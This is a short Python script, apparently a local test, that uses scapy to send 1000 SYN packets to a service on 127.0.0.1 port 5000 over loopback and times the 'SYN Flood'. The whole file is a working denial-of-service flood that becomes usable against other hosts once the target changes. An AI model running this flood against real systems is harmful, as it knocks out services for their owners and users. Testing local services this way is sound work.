from scapy.all import *
import time

target_ip = "127.0.0.1"
target_port = 5000

print(f"Starting SYN Flood on {target_ip}:{target_port}...")
start_time = time.time()

for i in range(1000):  # Send 1000 SYN packets
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags="S")  # SYN flag
    packet = ip / tcp
    send(packet, iface="lo0", verbose=True)  # Use loopback interface
    time.sleep(0.001)  # Small delay to avoid overwhelming the system

end_time = time.time()
print(f"Flood completed in {end_time - start_time:.2f} seconds.")
